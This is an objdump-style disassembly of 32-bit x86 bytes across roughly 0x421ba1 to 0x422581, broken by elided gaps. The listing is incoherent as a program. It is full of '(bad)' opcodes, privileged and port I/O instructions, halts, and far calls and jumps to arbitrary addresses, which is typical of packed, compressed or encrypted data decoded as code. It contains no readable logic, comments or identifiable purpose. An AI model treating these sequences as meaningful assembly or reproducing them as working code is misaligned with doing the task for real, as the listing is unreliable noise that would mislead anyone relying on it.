  421ba1:	lock sbb ebp,eax
  421ba4:	sbb    ebx,0xfffffffc
  421ba7:	call   FWORD PTR [ecx-0x69388f3f]
  421bad:	inc    eax
  421bae:	and    BYTE PTR [ebx+0xcf5e90d],cl
  421bb4:	push   ds
  421bb5:	repnz sbb ecx,DWORD PTR [ebp+0x4384ffcd]
  421bbc:	in     eax,dx
  421bbd:	cld    
  421bbe:	mov    bl,0x8b
  421bc0:	sbb    BYTE PTR [ecx-0x7b],bh
  421bc3:	push   es
  421bc4:	data16 ds cld 
  421bc7:	mov    DWORD PTR [ebx],ebx
  421bc9:	std    
  421bca:	add    BYTE PTR [esi-0x76fff737],ah
  421bd0:	sbb    eax,DWORD PTR [ecx]
  421bd2:	out    0xbf,eax
  421bd4:	push   cs
  421bd5:	pop    esp
  421bd6:	push   esi
  421bd7:	inc    DWORD PTR [eax]
	...
  421bf1:	enter  0x1210,0x40
  421bf5:	int    0xb7
  421bf7:	xlat   BYTE PTR ds:[ebx]
  421bf8:	xor    eax,DWORD PTR [edx-0x54dba54f]
  421bfe:	mov    dh,0xb
  421c00:	mov    dh,0xdb
  421c02:	popf   
  421c03:	or     esi,DWORD PTR [esi-0x3900632d]
  421c09:	dec    esi
  421c0a:	(bad)  
  421c0b:	repz icebp 
  421c0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c0e:	sbb    al,0xfb
  421c10:	je     0x421c0b
  421c12:	sbb    BYTE PTR [edi-0x2e],ah
  421c15:	hlt    
  421c16:	mov    cl,0x8f
  421c18:	inc    ebx
  421c19:	es or  al,0x54
  421c1c:	std    
  421c1d:	add    DWORD PTR [esi+0x12],esp
  421c20:	inc    eax
  421c21:	hlt    
  421c22:	push   ds
  421c23:	enter  0x710b,0xde
  421c27:	aaa    
  421c28:	sbb    DWORD PTR [ebx],eax
  421c2a:	cmp    al,0x46
  421c2c:	and    al,0xb3
  421c2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c2f:	mov    eax,0x56383271
  421c34:	and    al,0x74
  421c36:	sbb    dl,dh
  421c38:	jo     0x421c46
  421c3a:	shl    DWORD PTR [edx-0x37],cl
  421c3d:	sub    ah,al
  421c3f:	mov    edx,DWORD PTR [ebp-0x28]
  421c42:	push   ss
  421c43:	loop   0x421c9a
  421c45:	sbb    edx,ecx
  421c47:	sbb    al,0x12
  421c49:	mov    ah,0x9d
  421c4b:	pop    ebp
  421c4c:	mov    dh,BYTE PTR [edi]
  421c4e:	inc    edi
  421c4f:	ret    0xf403
  421c52:	aaa    
  421c53:	inc    ebx
  421c54:	and    eax,DWORD PTR [eax]
	...
  421c6e:	jmp    0x421c03
  421c70:	enter  0xb4fd,0xd2
  421c74:	jb     0x421c35
  421c76:	sti    
  421c77:	xor    esi,DWORD PTR [edi-0x778d146a]
  421c7d:	push   ebp
  421c7e:	adc    DWORD PTR [edi-0x35],eax
  421c81:	adc    ebx,DWORD PTR [esi-0x26]
  421c84:	mov    ebp,0x8fae1073
  421c89:	inc    ebx
  421c8a:	add    eax,0xe1fd50cc
  421c8f:	jmp    0x1f365ca9
  421c94:	lds    ecx,FWORD PTR [ebx]
  421c96:	addr16 pushf 
  421c98:	test   eax,0xe8196fc0
  421c9d:	add    eax,DWORD PTR [edx+0x7]
  421ca0:	ror    BYTE PTR [ebx],cl
  421ca2:	sub    esp,DWORD PTR [edi]
  421ca4:	mov    esp,0xef053388
  421ca9:	sub    dh,BYTE PTR [eax+eax*1+0x7ff0366c]
  421cb0:	in     al,0x2
  421cb2:	inc    ebx
  421cb3:	pop    es
  421cb4:	sub    dl,bh
  421cb6:	cmp    dh,BYTE PTR [esi]
  421cb8:	repnz nop
  421cba:	lods   eax,DWORD PTR ds:[esi]
  421cbb:	add    BYTE PTR [ecx-0x19244e55],bl
  421cc1:	add    ebx,DWORD PTR [ebp+0x6]
  421cc4:	stc    
  421cc5:	ret    
  421cc6:	ja     0x421c8c
  421cc8:	call   0xb88a:0xef43410e
  421ccf:	cld    
  421cd0:	cmp    DWORD PTR [esi+0x0],0x0
	...
  421cea:	add    bh,bh
  421cec:	pop    ebx
  421ced:	push   DWORD PTR [ebx]
  421cef:	inc    edi
  421cf0:	add    al,0xe7
  421cf2:	pop    esi
  421cf3:	ret    0xe2c6
  421cf6:	add    ebp,DWORD PTR [ebp+0x48]
  421cf9:	retf   
  421cfa:	pop    es
  421cfb:	int    0x45
  421cfd:	fbstp  TBYTE PTR [edx]
  421cff:	sti    
  421d00:	jge    0x421d29
  421d02:	or     al,0x8d
  421d04:	(bad)  
  421d05:	jmp    0xdc08:0x5781a455
  421d0c:	push   esi
  421d0d:	mov    ah,0x4
  421d0f:	hlt    
  421d10:	push   edx
  421d11:	test   eax,0x7257f408
  421d16:	mov    al,0x74
  421d18:	mov    eax,ds:0x45e50d6
  421d1d:	push   ss
  421d1e:	mov    ebp,0x43f6e8e6
  421d23:	hlt    
  421d24:	xchg   DWORD PTR [esi-0x4e09bcc8],esp
  421d2a:	push   ecx
  421d2b:	inc    ebp
  421d2c:	pop    ds
  421d2d:	call   0xcf5ac686
  421d32:	adc    esi,DWORD PTR [eax*1+0x1d27c464]
  421d39:	add    BYTE PTR [edx],bl
  421d3b:	add    DWORD PTR [edi-0x4],0x19
  421d3f:	fidiv  WORD PTR [ecx+0x44c09164]
  421d45:	add    BYTE PTR [esi-0x1d],bl
  421d48:	loopne 0x421d59
  421d4a:	test   eax,0xd5bf85f7
	...
  421d67:	add    BYTE PTR [esi+0x7f],ch
  421d6a:	inc    edx
  421d6b:	cmp    eax,0x41427dc8
  421d70:	sar    BYTE PTR [ebp+0x42],0x39
  421d74:	test   al,0xaf
  421d76:	jb     0x421da5
  421d78:	jg     0x421dc9
  421d7a:	clc    
  421d7b:	es jmp 0x421d72
  421d7e:	pop    gs
  421d80:	test   DWORD PTR [ebp-0x4ff46241],0x37691572
  421d8a:	clc    
  421d8b:	push   es
  421d8c:	jmp    0x421d42
  421d8e:	push   esp
  421d8f:	inc    BYTE PTR [edx]
  421d91:	stc    
  421d92:	pop    gs
  421d94:	test   DWORD PTR [ebp-0x50058b41],0x1740e572
  421d9e:	mov    bl,bh
  421da0:	mov    bh,0x4
  421da2:	and    DWORD PTR [esp+esi*4],0x23da38b0
  421da9:	add    ebp,eax
  421dab:	out    dx,eax
  421dac:	repz add al,0x0
  421daf:	jmp    0x60464d22
  421db4:	xor    ebp,edi
  421db6:	mov    BYTE PTR [esp+esi*4],ah
  421db9:	pushf  
  421dba:	add    edx,ebx
  421dbc:	mov    bh,0x4c
  421dbe:	(bad)  
  421dbf:	stos   BYTE PTR es:[edi],al
  421dc0:	and    bh,BYTE PTR [ebx+ebp*8+0x38]
  421dc4:	dec    edx
  421dc5:	jl     0x421df9
  421dc7:	leave  
  421dc8:	pop    es
  421dc9:	inc    ebp
	...
  421de2:	add    BYTE PTR [eax],al
  421de4:	add    BYTE PTR [edx],al
  421de6:	add    BYTE PTR [ecx-0x4],0xfd
  421dea:	fdivp  st(7),st
  421dec:	imul   ebx,DWORD PTR [ebp-0x7f010325],0x10d6fafd
  421df6:	(bad)  
  421df7:	jno    0x421e33
  421df9:	sbb    bl,BYTE PTR [ebx]
  421dfb:	or     al,0x13
  421dfd:	popf   
  421dfe:	add    eax,0xfa47f87f
  421e03:	sub    cl,BYTE PTR [ebx-0x3f7e8e70]
  421e09:	mov    eax,ds:0xf1d1e49d
  421e0e:	add    eax,0x8b058b00
  421e13:	sti    
  421e14:	je     0x421e0e
  421e16:	add    DWORD PTR [ecx-0x4],0xfc71707d
  421e1d:	jb     0x421dfa
  421e1f:	cld    
  421e20:	inc    BYTE PTR [eax-0x6f290503]
  421e26:	lds    esi,FWORD PTR [eax+0x4]
  421e29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e2a:	enter  0x8e7,0x72
  421e2e:	pop    ebp
  421e2f:	fst    st(4)
  421e31:	sbb    eax,0xbac02f05
  421e36:	dec    esi
  421e37:	(bad)
  421e3a:	add    eax,0xe9108b56
  421e3f:	adc    BYTE PTR [eax-0x23],al
  421e42:	push   ebx
  421e43:	push   0x1
  421e45:	mov    edx,0x1423f5
	...
  421e62:	(bad)  
  421e63:	pop    ss
  421e64:	xchg   DWORD PTR [ecx+eax*1-0x3],edx
  421e68:	xchg   bh,cl
  421e6a:	mov    ch,0x73
  421e6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e6d:	add    ch,cl
  421e6f:	xor    BYTE PTR [ebp-0x11d398c],bh
  421e75:	push   esi
  421e76:	hlt    
  421e77:	xchg   esi,eax
  421e78:	ror    DWORD PTR [eax+0x72b929ac],1
  421e7e:	call   0x4f9d:0xecc259e7
  421e85:	mov    DWORD PTR [eax+0x77f7a01b],esp
  421e8b:	xor    dl,BYTE PTR [eax]
  421e8d:	push   ecx
  421e8e:	sub    ch,BYTE PTR [edi-0x47]
  421e91:	jb     0x421e7b
  421e93:	xor    dh,BYTE PTR [esi-0x745a1604]
  421e99:	jae    0x421eab
  421e9b:	or     cl,BYTE PTR [ebx-0x4659e7b5]
  421ea1:	adc    dh,al
  421ea3:	fadd   DWORD PTR [eax+0x0]
  421ea6:	jg     0x421ebe
  421ea8:	jg     0x421e82
  421eaa:	sti    
  421eab:	sub    DWORD PTR [ebp+0x99e43ff],ecx
  421eb1:	mov    ch,0xa9
  421eb3:	mov    ch,0x87
  421eb5:	inc    ebx
  421eb6:	fdiv   DWORD PTR [ebp-0x365f02b0]
  421ebc:	or     al,0xd
  421ebe:	imul   esp,DWORD PTR [ecx+0x4],0x6a
  421ec2:	neg    ah
  421ec4:	mov    ds:0xf,eax
	...
  421edd:	add    BYTE PTR [eax],al
  421edf:	(bad)  
  421ee0:	fcom   QWORD PTR [ebx+0x6a]
  421ee3:	hlt    
  421ee4:	test   DWORD PTR [edi+edi*8+0x3],edi
  421ee8:	sahf   
  421ee9:	push   ebp
  421eea:	std    
  421eeb:	loope  0x421f36
  421eed:	cmovo  esi,esp
  421ef0:	and    cl,al
  421ef2:	jb     0x421ee4
  421ef4:	or     bl,ch
  421ef6:	call   0x247f523b
  421efb:	cld    
  421efc:	sbb    bh,BYTE PTR [ecx-0x7316b604]
  421f02:	xor    bh,al
  421f04:	fadd   DWORD PTR [eax+0x0]
  421f07:	dec    esi
  421f08:	add    eax,0x50735697
  421f0d:	ret    
  421f0e:	pop    ss
  421f0f:	mov    cl,0xd6
  421f11:	popa   
  421f12:	clc    
  421f13:	pop    es
  421f14:	sbb    ah,BYTE PTR [edi]
  421f16:	add    al,0xef
  421f18:	add    al,0xe7
  421f1a:	add    ebp,esp
  421f1c:	push   esp
  421f1d:	adc    DWORD PTR [esp+0x6ba9db0],esi
  421f24:	add    DWORD PTR [edx+0x4f],esp
  421f27:	fsub   st,st(4)
  421f29:	gs xor ah,ch
  421f2c:	jnp    0x421ed8
  421f2e:	fisttp WORD PTR [ebx]
  421f30:	popf   
  421f31:	mov    edi,0xc0af68ba
  421f36:	mov    bl,0x60
  421f38:	cmp    BYTE PTR [ebx],cl
  421f3a:	sbb    al,0x6d
  421f3c:	int3   
  421f3d:	cmp    eax,0x35b016d1
  421f42:	mov    edx,0x0
	...
  421f5b:	add    BYTE PTR [eax+0x54],al
  421f5e:	shl    DWORD PTR [ebx+0x17cb3840],0x39
  421f65:	xlat   BYTE PTR ds:[ebx]
  421f66:	adc    DWORD PTR [ecx],eax
  421f68:	ja     0x421f20
  421f6a:	call   0x6d59:0xae067305
  421f71:	ret    
  421f72:	mov    eax,ds:0x2951168e
  421f77:	or     esi,esp
  421f79:	pop    ecx
  421f7a:	bound  esp,QWORD PTR [edi+0x4daa08a]
  421f80:	hlt    
  421f81:	add    al,0x3d
  421f83:	lea    ecx,[ebx]
  421f85:	call   DWORD PTR [ebp-0x5b85ffc1]
  421f8b:	ret    
  421f8c:	retf   0xe215
  421f8f:	ret    0x406c
  421f92:	out    dx,eax
  421f93:	mov    edx,?
  421f95:	jnp    0x421fba
  421f97:	or     BYTE PTR [ebp+0x3c],bh
  421f9a:	add    ch,dl
  421f9c:	mov    dh,0xcf
  421f9e:	pop    es
  421f9f:	loop   0x421f57
  421fa1:	xchg   DWORD PTR [edx-0xb],eax
  421fa4:	jb     0x421fe9
  421fa6:	or     al,0x70
  421fa8:	xor    ebp,DWORD PTR [edx+0x7b6d96fd]
  421fae:	adc    BYTE PTR [ecx-0x51034ea2],0x1b
  421fb5:	mov    dh,0xfd
  421fb7:	jle    0x422006
  421fb9:	scas   eax,DWORD PTR es:[edi]
  421fba:	cld    
  421fbb:	jmp    0xe9c4e7b7
	...
  421fd8:	add    BYTE PTR [ecx+esi*4],bh
  421fdb:	cld    
  421fdc:	in     eax,dx
  421fdd:	test   DWORD PTR [eax+eax*1],0xfd242351
  421fe4:	push   esi
  421fe5:	into   
  421fe6:	vpsraw xmm6,xmm7,xmm7
  421fea:	push   ecx
  421feb:	mov    DWORD PTR [ebp+0x71],edx
  421fee:	mov    ds:0x2b7898f7,al
  421ff3:	or     al,0xe9
  421ff5:	mov    al,ds:0xe2b55556
  421ffa:	jnp    0x422056
  421ffc:	std    
  421ffd:	jbe    0x421fac
  421fff:	mov    edi,0x75ae8d1e
  422004:	mov    bl,0x78
  422006:	sub    ecx,DWORD PTR [eax]
  422008:	(bad)  
  422009:	cmc    
  42200a:	jnp    0x42204b
  42200c:	fnsave [edx+0x3a]
  42200f:	sbb    cl,bl
  422011:	cmp    BYTE PTR [ecx-0x51ddb719],0xfc
  422018:	cmp    BYTE PTR gs:[edx],dh
  42201b:	inc    ecx
  42201c:	jb     0x422012
  42201e:	jnp    0x42208f
  422020:	cmc    
  422021:	clc    
  422022:	mov    ah,0x86
  422024:	aaa    
  422025:	clc    
  422026:	sbb    eax,0x72b00555
  42202c:	add    cl,ah
  42202e:	cmp    BYTE PTR [edi+0x5318f08b],0x8d
  422035:	add    ebx,DWORD PTR [ecx]
  422037:	call   0xfbaeb294
  42203c:	mov    eax,DWORD PTR [eax]
	...
  422056:	xor    BYTE PTR ds:0x80a57d87,dl
  42205c:	inc    ecx
  42205d:	or     al,0x16
  42205f:	cmp    al,0x8
  422061:	mov    DWORD PTR [ebx-0x72fbbd3c],ebx
  422067:	add    DWORD PTR [edx],eax
  422069:	add    BYTE PTR [esp+ecx*2],al
  42206c:	or     al,0x8b
  42206e:	call   0x1439:0x8c10bd88
  422075:	mov    al,0x8c
  422077:	pusha  
  422078:	(bad)  
  422079:	xor    DWORD PTR ds:0xd65b5e4d,ebx
  42207f:	mov    ds,WORD PTR [ecx-0x3e]
  422082:	pop    ebp
  422083:	add    DWORD PTR [ecx-0x75],edx
  422086:	ror    DWORD PTR [eax+0x6c6e0ce8],0x71
  42208d:	adc    al,dl
  42208f:	out    dx,al
  422090:	repz xor esp,esi
  422093:	push   ecx
  422094:	test   DWORD PTR [ebp-0x27],ebx
  422097:	jp     0x4220f2
  422099:	cld    
  42209a:	add    eax,0x1d01116f
  42209f:	sub    eax,0x6c4275bd
  4220a4:	jno    0x42209a
  4220a6:	add    eax,0x1d00ce60
  4220ab:	jg     0x42206c
  4220ad:	pop    ebx
  4220ae:	aam    0xc7
  4220b0:	or     BYTE PTR [eax],al
  4220b2:	adc    bl,bh
  4220b4:	sti    
  4220b5:	call   FWORD PTR [eax+0x75fb74]
	...
  4220d3:	loope  0x422148
  4220d5:	jno    0x4220df
  4220d7:	hlt    
  4220d8:	lds    eax,FWORD PTR [edx-0x3]
  4220db:	jecxz  0x422098
  4220dd:	mov    edi,edx
  4220df:	iret   
  4220e0:	bound  edi,QWORD PTR [esi-0x41]
  4220e3:	dec    ecx
  4220e4:	cdq    
  4220e5:	mov    esi,edi
  4220e7:	jbe    0x4220df
  4220e9:	cmovo  eax,DWORD PTR [esi+0x3]
  4220ed:	cmp    DWORD PTR [edi-0x770368fc],0x4387b644
  4220f7:	imul   BYTE PTR [ebp+0x666f0e89]
  4220fd:	call   0x105290cb
  422102:	xor    DWORD PTR [ebp+0x3c9f9ce],0x4894aa7
  42210c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42210d:	add    edi,ebp
  42210f:	mov    edi,0xf676564f
  422114:	push   cs
  422115:	(bad)  
  422116:	shl    BYTE PTR [edi],0xde
  422119:	test   al,0x14
  42211b:	outs   dx,DWORD PTR ds:[esi]
  42211c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42211d:	stc    
  42211e:	dec    ebx
  42211f:	adc    BYTE PTR [esi+0x767f0d2f],dh
  422125:	cld    
  422126:	jle    0x42217d
  422128:	sahf   
  422129:	add    BYTE PTR [eax],al
  42212b:	les    esi,FWORD PTR [esp+eax*2+0x789e824]
  422132:	mov    eax,eax
  422134:	sar    esp,0xe7
	...
  42214f:	add    BYTE PTR [edx+0x13],dl
  422152:	mov    ch,0xfc
  422154:	jns    0x422134
  422156:	fdiv   QWORD PTR cs:[esi]
  422159:	mov    dl,0x0
  42215b:	push   ebx
  42215c:	jg     0x422158
  42215e:	push   edx
  42215f:	mov    DWORD PTR [edx+0x795551a1],esi
  422165:	fisubr WORD PTR [edi]
  422167:	push   0x77
  422169:	add    eax,0x9d4401a7
  42216e:	adc    eax,0x61abebd2
  422173:	mov    ebx,0x80cb297a
  422178:	fdiv   DWORD PTR [eax]
  42217a:	pop    ds
  42217b:	scas   al,BYTE PTR es:[edi]
  42217c:	cmp    DWORD PTR [ecx],eax
  42217e:	call   0x3b574b0b
  422183:	test   eax,0xdeabdf32
  422189:	(bad)  
  42218a:	out    0x3,al
  42218c:	jge    0x42213a
  42218e:	arpl   WORD PTR [esi-0x126a11d9],si
  422194:	ins    BYTE PTR es:[edi],dx
  422195:	inc    edx
  422196:	fbstp  TBYTE PTR [esi+0x418efd26]
  42219c:	xchg   edx,eax
  42219d:	stos   DWORD PTR es:[edi],eax
  42219e:	jge    0x422156
  4221a0:	push   es
  4221a1:	test   eax,0xabf03d61
  4221a6:	hlt    
  4221a7:	or     esi,DWORD PTR [ebx+0x41]
  4221aa:	out    dx,eax
  4221ab:	dec    esi
  4221ac:	jg     0x4221ef
  4221ae:	out    dx,eax
  4221af:	stos   DWORD PTR es:[edi],eax
  4221b0:	popa   
  4221b1:	lods   eax,DWORD PTR ds:[esi]
  4221b2:	push   ebp
  4221b3:	mov    dh,0x0
	...
  4221cd:	enter  0x2e7f,0xab
  4221d1:	out    dx,al
  4221d2:	(bad)  
  4221d3:	out    0x3,al
  4221d5:	jne    0x422186
  4221d7:	out    0x30,eax
  4221d9:	(bad)  
  4221da:	lahf   
  4221db:	or     BYTE PTR [ebx+0x3deffcb9],cl
  4221e1:	call   0xa6f91916
  4221e6:	test   al,0xe
  4221e8:	lods   eax,DWORD PTR ds:[esi]
  4221e9:	cmp    al,BYTE PTR [edi+eiz*8]
  4221ec:	repnz arpl WORD PTR [ebx-0x4e],cx
  4221f0:	int3   
  4221f1:	xor    eax,0xc9b6e700
  4221f6:	stos   DWORD PTR es:[edi],eax
  4221f7:	jae    0x422204
  4221f9:	sbb    al,0xa8
  4221fb:	push   ebx
  4221fd:	dec    ecx
  4221fe:	test   al,0x88
  422200:	lahf   
  422201:	repz jge 0x422246
  422204:	in     eax,0xb2
  422206:	push   es
  422207:	or     cl,ch
  422209:	jl     0x422243
  42220b:	or     al,0xaf
  42220d:	xor    al,0xfd
  42220f:	(bad)  
  422210:	call   0x1e97f0a1
  422215:	mov    DWORD PTR [esi],esi
  422217:	and    al,0xd5
  422219:	les    ebp,FWORD PTR [ecx+0x16d43dfc]
  42221f:	std    
  422220:	xor    eax,0xcae816d4
  422225:	push   0x6072fca9
  42222a:	xchg   ebp,esi
  42222c:	sbb    eax,0xc573a800
	...
  422249:	add    bl,dh
  42224b:	pushf  
  42224c:	cmp    al,0x86
  42224e:	dec    ecx
  42224f:	test   eax,0xa90b8188
  422254:	jae    0x422236
  422256:	add    cl,ch
  422258:	jae    0x42223e
  42225a:	ins    BYTE PTR es:[edi],dx
  42225b:	inc    eax
  42225c:	or     al,0x70
  42225e:	cmc    
  42225f:	jnp    0x422225
  422261:	mov    esi,0xe90bc6c1
  422266:	mov    dl,0x7b
  422268:	jmp    0x4222d2
  42226a:	mov    esi,?
  42226c:	(bad)  
  42226d:	call   0xed84d569
  422272:	not    BYTE PTR [ebx+0x56]
  422275:	sahf   
  422276:	ins    BYTE PTR es:[edi],dx
  422277:	das    
  422278:	or     dh,bl
  42227a:	mov    ebx,0xf7e8ff7e
  42227f:	repz mov edi,0xa5a23172
  422285:	pop    ss
  422286:	imul   ebp,DWORD PTR [ecx-0x5064e678],0x2d7b0073
  422290:	std    
  422291:	call   FWORD PTR ds:0xd3e7ef6
  422297:	fisub  DWORD PTR [ecx-0x75]
  42229a:	push   ebx
  42229b:	stos   BYTE PTR es:[edi],al
  42229c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42229d:	add    ch,bl
  42229f:	add    DWORD PTR [eax],eax
  4222a1:	jne    0x4222d8
  4222a3:	retf   0xfffb
  4222a6:	mov    ebp,0xd1468570
  4222ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4222ac:	mov    edi,0x89
	...
  4222c5:	add    BYTE PTR [eax],al
  4222c7:	and    ch,bh
  4222c9:	xchg   dh,al
  4222cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4222cc:	adc    DWORD PTR [edi+0x70ffc608],eax
  4222d2:	push   ss
  4222d3:	push   esi
  4222d4:	ds add al,0x23
  4222d7:	data16 lods al,BYTE PTR ds:[esi]
  4222d9:	dec    ecx
  4222da:	or     al,0x0
  4222dc:	std    
  4222dd:	repnz inc eax
  4222df:	xchg   ecx,eax
  4222e0:	add    eax,0xda8d0e00
  4222e5:	jae    0xcfc928a8
  4222eb:	gs dec ebp
  4222ed:	(bad)  
  4222ee:	dec    DWORD PTR [edx]
  4222f0:	sub    edi,DWORD PTR [ebp+0x1d5c6475]
  4222f6:	add    DWORD PTR [ebx],0x1
  4222f9:	xchg   DWORD PTR [eax+0x51],ecx
  4222fc:	pop    eax
  4222fd:	mov    ebp,0xfffd4d00
  422302:	jae    0x422354
  422304:	test   BYTE PTR [eax+eax*1],bl
  422307:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422308:	(bad)  
  422309:	jl     0x4222ec
  42230b:	or     dh,BYTE PTR [ecx-0x14]
  42230e:	call   esp
  422310:	cmp    eax,0x844eeb04
  422315:	and    al,BYTE PTR [eax]
  422317:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422318:	addr16 xchg edi,ecx
  42231b:	add    eax,0xf4fffa9e
  422320:	adc    cl,BYTE PTR [eax+0x2e1171ef]
  422326:	test   DWORD PTR [esi+0x82667],ebx
	...
  422344:	or     esi,DWORD PTR [eax-0x28]
  422347:	aad    0xb7
  422349:	fwait
  42234a:	mov    bl,0x12
  42234c:	ror    ah,1
  42234e:	inc    eax
  42234f:	add    BYTE PTR [edi-0x3a],bh
  422352:	jp     0x4223ae
  422354:	clc    
  422355:	and    ah,al
  422357:	or     al,0x78
  422359:	test   al,0x3
  42235b:	add    ah,dh
  42235d:	dec    eax
  42235e:	xor    al,0x14
  422360:	mov    ebx,0xcbfff098
  422365:	sahf   
  422366:	jge    0x422374
  422368:	outs   dx,DWORD PTR ds:[esi]
  422369:	in     eax,0xb
  42236b:	xchg   DWORD PTR [esi+edx*8],ebp
  42236e:	jge    0x42237c
  422370:	jg     0x422367
  422372:	ja     0xc037cdb4
  422378:	outs   dx,DWORD PTR ds:[esi]
  422379:	pop    edi
  42237a:	pushf  
  42237b:	bound  esi,QWORD PTR [edi-0x49]
  42237e:	add    BYTE PTR [edi+ebp*1+0x33],dh
  422382:	dec    ecx
  422383:	or     BYTE PTR [edi-0x68],bh
  422386:	test   DWORD PTR [edi-0x7547651c],edi
  42238c:	add    edx,ecx
  42238e:	jnp    0x4223d2
  422390:	jo     0x4223e8
  422392:	int3   
  422393:	int3   
  422394:	hlt    
  422395:	popf   
  422396:	jge    0x4223f2
  422398:	lock sbb esp,eax
  42239b:	or     al,0x70
  42239d:	or     al,BYTE PTR [eax+eax*1]
  4223a0:	hlt    
  4223a1:	xor    al,BYTE PTR [ecx]
  4223a3:	mov    eax,edi
  4223a5:	sar    DWORD PTR [ebp+0x5],1
	...
  4223c0:	add    bh,dh
  4223c2:	fidivr DWORD PTR [edx+0x7]
  4223c5:	outs   dx,DWORD PTR ds:[esi]
  4223c6:	xchg   DWORD PTR [edi+eax*4],eax
  4223c9:	mov    esp,0xb87eeb04
  4223ce:	cld    
  4223cf:	outs   dx,DWORD PTR ds:[esi]
  4223d0:	cmp    al,0xec
  4223d2:	jnp    0x422379
  4223d4:	push   DWORD PTR [edx+0x3d]
  4223d7:	fstp   TBYTE PTR [esi-0x45]
  4223da:	cld    
  4223db:	imul   edi,DWORD PTR [ebp-0x7f67ed79],0xffffffb0
  4223e2:	adc    al,0x98
  4223e4:	xchg   BYTE PTR [ebx],bh
  4223e6:	adc    eax,0x3906b297
  4223eb:	std    
  4223ec:	inc    ebx
  4223ed:	hlt    
  4223ee:	and    DWORD PTR [edx-0x2cbe9301],0x4
  4223f5:	bnd jnp 0x422413
  4223f8:	cld    
  4223f9:	jl     0x4223ba
  4223fb:	into   
  4223fc:	das    
  4223fd:	iret   
  4223fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4223ff:	mov    ebp,0xb581cb7e
  422404:	cmp    BYTE PTR [ebx+edi*2+0x29],ah
  422408:	sbb    bh,ch
  42240a:	add    al,0xe7
  42240c:	arpl   WORD PTR [ebx+0x6387162e],bp
  422412:	aam    0x36
  422414:	xor    DWORD PTR [esi*8-0x1af37eca],0x2593c3b9
  42241f:	jl     0x422424
  422421:	hlt    
  422422:	and    BYTE PTR [esi+0x37],0x0
	...
  42243d:	add    BYTE PTR [ebx],bl
  42243f:	sbb    esp,edi
  422441:	sbb    eax,0x914f5408
  422446:	ret    
  422447:	add    al,0xe7
  422449:	xchg   dh,bl
  42244b:	adc    al,0xe7
  42244d:	jle    0x42242b
  42244f:	adc    bl,dl
  422451:	dec    eax
  422452:	cmp    DWORD PTR [ecx-0x58b74ec6],eax
  422458:	loop   0x42245d
  42245a:	hlt    
  42245b:	add    al,0x0
  42245d:	ins    BYTE PTR es:[edi],dx
  42245e:	xchg   BYTE PTR [ebx],dh
  422460:	or     eax,0xf07c4e62
  422465:	je     0x4224e3
  422467:	mov    bl,0xfd
  422469:	push   ds
  42246a:	data16 lahf 
  42246c:	xchg   edx,eax
  42246d:	mov    dh,0x66
  42246f:	test   al,0xfc
  422471:	xchg   esp,eax
  422472:	out    0x85,eax
  422474:	mov    ds:0xfca844fd,al
  422479:	jmp    0xf835a6f2
  42247e:	inc    ebp
  42247f:	test   al,0xe7
  422481:	mov    ebx,0x6cfca846
  422486:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422487:	xor    cl,BYTE PTR ds:0xf07dbd72
  42248d:	fs jae 0x422442
  422490:	std    
  422491:	into   
  422492:	test   DWORD PTR [esi-0x567ad996],ebx
  422498:	mov    BYTE PTR [esp+ebx*8],ah
  42249b:	jge    0x4224b4
  42249d:	bound  ebp,QWORD PTR [ebp+0x1a079d]
	...
  4224bb:	nop
  4224bc:	imul   ecx,esp,0xffffffe9
  4224bf:	div    ebx
  4224c1:	mov    edi,0xc74c463e
  4224c6:	stos   DWORD PTR es:[edi],eax
  4224c7:	add    BYTE PTR ds:0x9cfc0356,al
  4224cd:	mov    esi,DWORD PTR [esi-0x567cfb10]
  4224d3:	mov    esp,0xf7c980ff
  4224d8:	jnp    0x4224c9
  4224da:	cmp    dl,0xf3
  4224dd:	cmc    
  4224de:	ins    BYTE PTR es:[edi],dx
  4224df:	scas   al,BYTE PTR es:[edi]
  4224e0:	xor    dh,BYTE PTR [esi]
  4224e2:	shr    DWORD PTR [ebx+0x1c],cl
  4224e5:	or     BYTE PTR [esi+0x63],dl
  4224e8:	into   
  4224e9:	aad    0xaa
  4224eb:	mul    DWORD PTR [edi+0x11f90012]
  4224f1:	inc    eax
  4224f2:	add    ah,al
  4224f4:	cli    
  4224f5:	add    al,0x79
  4224f8:	push   cs
  4224f9:	xchg   DWORD PTR [ecx+edi*8-0x58],ecx
  4224fd:	ret    
  4224fe:	inc    eax
  4224ff:	sub    DWORD PTR [edx+0x290dfffc],esi
  422505:	add    ecx,DWORD PTR [ecx-0x397909ab]
  42250b:	test   BYTE PTR [edx],0x50
  42250e:	call   0x3eea79
  422513:	imul   ecx,DWORD PTR [edx+0x20dcf61],0x2f
  42251a:	rol    BYTE PTR [ebx+0xbf],0x0
	...
  422535:	add    BYTE PTR [eax],al
  422537:	add    BYTE PTR [eax],ch
  422539:	sub    cl,ch
  42253b:	xor    DWORD PTR [ecx-0x32000307],0xaf1874b
  422545:	sub    ch,dh
  422547:	test   DWORD PTR [ebx-0x32317bfc],ecx
  42254d:	add    DWORD PTR [eax],eax
  42254f:	lea    ecx,[edx]
  422551:	sar    DWORD PTR [ecx],1
  422553:	shl    BYTE PTR [edx-0x6c],1
  422556:	cld    
  422557:	push   cs
  422558:	sbb    al,dl
  42255a:	cld    
  42255b:	dec    DWORD PTR [ebp+0xe0c4228]
  422561:	(bad)  
  422562:	std    
  422563:	mov    al,bl
  422565:	add    al,0x71
  422567:	adc    edx,ebp
  422569:	dec    edx
  42256a:	call   0x437805
  42256f:	mov    edi,ebp
  422571:	jle    0x422565
  422573:	psubusw mm3,QWORD PTR ds:0x805dfffd
  42257a:	jns    0x422584
  42257c:	dec    ebp
  42257d:	in     eax,dx
  42257e:	inc    eax
  42257f:	push   esp
  422581:	enter  0x80f8,0x99
